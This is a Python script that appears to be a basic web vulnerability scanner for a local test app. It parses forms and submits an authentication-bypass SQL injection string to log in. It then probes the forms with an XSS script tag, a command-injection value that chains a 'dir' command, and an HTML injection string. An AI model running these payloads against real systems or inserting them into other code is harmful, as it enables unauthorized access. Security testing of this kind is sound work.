import sys
import requests
from bs4 import BeautifulSoup


def create_session():
    session = requests.Session()
    print("Creating session")
    return session


def parse_input_fields(url, session):
    """
    Parses a webpage to extract input fields from forms.
    Prints the names of the input fields and their types for debugging.
    Returns a list of forms with their input fields.
    """
    try:
        response = session.get(url)
        soup = BeautifulSoup(response.text, "html.parser")
        
        forms = []
        for form_index, form in enumerate(soup.find_all("form")):
            form_details = {
                "action": form.get("action") or "",  # Default to an empty string if 'action' is missing
                "method": form.get("method", "get").lower(),
                "inputs": []
            }
            print(f"\n[DEBUG] Form {form_index + 1}:")
            print(f"  Action: {form_details['action']}")
            print(f"  Method: {form_details['method'].upper()}")
            
            for input_tag in form.find_all("input"):
                input_name = input_tag.get("name")  # Might be None if 'name' is missing
                input_type = input_tag.get("type", "text")  # Default to 'text' if 'type' is missing
                
                if input_name:  # Only include input fields with a valid 'name'
                    print(f"    - Input Field: Name = {input_name}, Type = {input_type}")
                    form_details["inputs"].append({
                        "name": input_name,
                        "type": input_type
                    })
            
            forms.append(form_details)
        
        print(f"\n[DEBUG] Found {len(forms)} form(s) on the page.")
        return forms
    except Exception as e:
        print(f"[-] Error while parsing input fields: {e}")
        return []


def test_sql_injection(base_url, session):
    results=[]
    if session == None:
        session = create_session()
    forms = parse_input_fields(base_url, session)
    for form_index, form in enumerate(forms):
        # Handle missing or empty form action
        form_action = form["action"]
        if not form_action:  # Default to the base URL if action is empty
            results.append(f"[DEBUG] Form {form_index + 1} has no action. Using base URL as form action.")
            form_action = base_url
        elif not form_action.startswith("http"):  # Handle relative URLs
            form_action = base_url.rstrip("/") + "/" + form_action.lstrip("/")

        results.append(f"[DEBUG] Form action URL: {form_action}")

        # Construct payload for SQL Injection
        payload = {
            input_field["name"]: "admin' OR '1'='1" if input_field["type"] == "text" else "password"
            for input_field in form["inputs"] if input_field["name"]
        }

        try:
            # Send the payload using the appropriate HTTP method
            if form["method"] == "post":
                response = session.post(form_action, data=payload)
            else:
                response = session.get(form_action, params=payload)

            results.append("\n[DEBUG] SQL Injection Response:")
            if "Welcome" in response.text or "Dashboard" in response.text:
                results.append("[+] SQL Injection successful!")
            else:
                results.append("[-] SQL Injection failed.")
        except Exception as e:
            results.append(f"[-] Error while testing SQL Injection: {e}")
    return results

def test_xss(base_url, session):
    results = []

    forms = parse_input_fields(base_url, session)
    for form_index, form in enumerate(forms):
        # Handle missing or empty form action
        form_action = form["action"]
        if not form_action:  # Default to the base URL if action is empty
            results.append(f"[DEBUG] Form {form_index + 1} has no action. Using base URL as form action.")
            form_action = base_url
        elif not form_action.startswith("http"):  # Handle relative URLs
            form_action = base_url.rstrip("/") + "/" + form_action.lstrip("/")

        results.append(f"[DEBUG] Form action URL: {form_action}")

        # Dynamically construct the payload from the parsed input fields
        payload = {}
        for input_field in form["inputs"]:
            field_name = input_field["name"]
            field_type = input_field["type"]

            # Assign XSS payload to text and textarea fields; assign "test" to others
            if field_type in ["text", "textarea"]:
                payload[field_name] = "<script>alert('XSS');</script>"
            else:
                payload[field_name] = "test"

        # Debug the payload to ensure it matches the parsed form fields
        results.append(f"[DEBUG] Payload constructed for Form {form_index + 1}: {payload}")

        try:
            # Send the payload using the appropriate HTTP method
            if form["method"] == "post":
                response = session.post(form_action, data=payload)
            else:
                response = session.get(form_action, params=payload)

            results.append(f"\n[DEBUG] XSS Response for Form {form_index + 1}:")
            #print(response.text)  # Debug the server response
            if "<script>alert('XSS');</script>" in response.text:
                results.append(f"[+] XSS vulnerability confirmed in Form {form_index + 1}! Payload executed.")
            else:
                results.append(f"[-] XSS payload was not executed for Form {form_index + 1}.")
        except Exception as e:
            results.append(f"[-] Error while testing XSS for Form {form_index + 1}: {e}")
    return results


def test_command_injection(base_url, session):
    results = []

    forms = parse_input_fields(base_url, session)
    for form in forms:
        form_action = base_url + form["action"]
        payload = {
            input_field["name"]: "127.0.0.1 & dir" if input_field["type"] == "text" else "test"
            for input_field in form["inputs"] if input_field["name"]
        }
        try:
            if form["method"] == "post":
                response = session.post(form_action, data=payload)
            else:
                response = session.get(form_action, params=payload)
            results.append(f"\n[DEBUG] Command Injection Response:")
            if "Directory" in response.text or "bin" in response.text:
                results.append(f"[+] Command Injection successful!")
            else:
                results.append(f"[-] Command Injection failed.")
        except Exception as e:
            results.append(f"[-] Error while testing Command Injection: {e}")
    return results


def test_html_injection(base_url, session):
    results = []
    forms = parse_input_fields(base_url, session)
    for form_index, form in enumerate(forms):
        # Handle missing or empty form action
        form_action = form["action"]
        if not form_action:  # Default to the base URL if action is empty
            results.append(f"[DEBUG] Form {form_index + 1} has no action. Using base URL as form action.")
            form_action = base_url
        elif not form_action.startswith("http"):  # Handle relative URLs
            form_action = base_url.rstrip("/") + "/" + form_action.lstrip("/")

        results.append(f"[DEBUG] Form action URL: {form_action}")

        # Dynamically construct the payload from the parsed input fields
        payload = {}
        for input_field in form["inputs"]:
            field_name = input_field["name"]
            field_type = input_field["type"]

            # Assign HTML injection payload to text and textarea fields; assign "test" to others
            if field_type in ["text", "textarea"]:
                payload[field_name] = "<h1>hacked</h1>"
            else:
                payload[field_name] = "test"

        # Debug the payload to ensure it matches the parsed form fields
        results.append(f"[DEBUG] Payload constructed for Form {form_index + 1}: {payload}")

        try:
            # Send the payload using the appropriate HTTP method
            if form["method"] == "post":
                response = session.post(form_action, data=payload)
            else:
                response = session.get(form_action, params=payload)

            results.append(f"\n[DEBUG] HTML Injection Response for Form {form_index + 1}:")
            #print(response.text)  # Debug the server response
            if "<h1>hacked</h1>" in response.text:
                results.append(f"[+] HTML Injection vulnerability confirmed in Form {form_index + 1}! Payload executed.")
            else:
                results.append(f"[-] HTML Injection payload was not executed for Form {form_index + 1}.")
        except Exception as e:
            results.append(f"[-] Error while testing HTML Injection for Form {form_index + 1}: {e}")
    return results

def xss_only(target_url):
    results = []
    session = create_session()

    # Step 1: Perform SQL Injection on the login page
    login_url = "/".join(target_url.split("/")[:3])  # Extract base URL (e.g., http://127.0.0.1:5000)
    results.append(f"[+] Attempting SQL Injection on login page: {login_url}...")
    sql_results = test_sql_injection(login_url, session)

    if any("[+]" in result for result in sql_results):  # Continue only if any SQL Injection result was successful
        results.extend(sql_results)
        results.append(f"[+] Login successful! Proceeding to the target page...")

        results.extend(test_xss(target_url,session))
    return results


def command_only(target_url):
    results = []
    session = create_session()

    # Step 1: Perform SQL Injection on the login page
    login_url = "/".join(target_url.split("/")[:3])  # Extract base URL (e.g., http://127.0.0.1:5000)
    results.append(f"[+] Attempting SQL Injection on login page: {login_url}...")
    sql_results = test_sql_injection(login_url, session)

    if any("[+]" in result for result in sql_results):  # Continue only if any SQL Injection result was successful
        results.extend(sql_results)
        results.append(f"[+] Login successful! Proceeding to the target page...")

        # Use the main Command Injection function to test dynamically
        results.extend(test_command_injection(target_url, session))
    else:
        results.append("[-] SQL Injection failed. Skipping XSS, Command Injection, and HTML Injection tests.")

    return results

def html_only(target_url):
    results = []
    session = create_session()

    # Step 1: Perform SQL Injection on the login page
    login_url = "/".join(target_url.split("/")[:3])  # Extract base URL (e.g., http://127.0.0.1:5000)
    results.append(f"[+] Attempting SQL Injection on login page: {login_url}...")
    sql_results = test_sql_injection(login_url, session)

    if any("[+]" in result for result in sql_results):  # Continue only if any SQL Injection result was successful
        results.extend(sql_results)
        results.append(f"[+] Login successful! Proceeding to the target page...")

        # Use the main Command Injection function to test dynamically
        results.extend(test_html_injection(target_url, session))
    else:
        results.append("[-] SQL Injection failed. Skipping XSS, Command Injection, and HTML Injection tests.")
    return results

def complete_scan(target_url):
    results = []

    results.append(f"=== Vulnerability Scanner ===")
    # Create a session to handle cookies
    session = create_session()
    # Step 1: Perform SQL Injection on the login page
    login_url = "/".join(target_url.split("/")[:3])  # Extract base URL (e.g., http://127.0.0.1:5000)
    print(f"[+] Attempting SQL Injection on login page: {login_url}...")
    sql_results = test_sql_injection(login_url, session)

    if any("[+]" in result for result in sql_results):  # Continue only if any SQL Injection result was successful
        results.extend(sql_results)
        results.append(f" [+] Login successful! Proceeding to the target page...")

        # Run XSS Test
        results.extend(test_xss(target_url, session))
        # Run Command Injection Test
        results.extend(test_command_injection(target_url, session))
        # Run HTML Injection Test
        results.extend(test_html_injection(target_url, session))
    else:
        results.append(" [-] SQL Injection failed. Skipping XSS, Command Injection, and HTML Injection tests.")


    return results

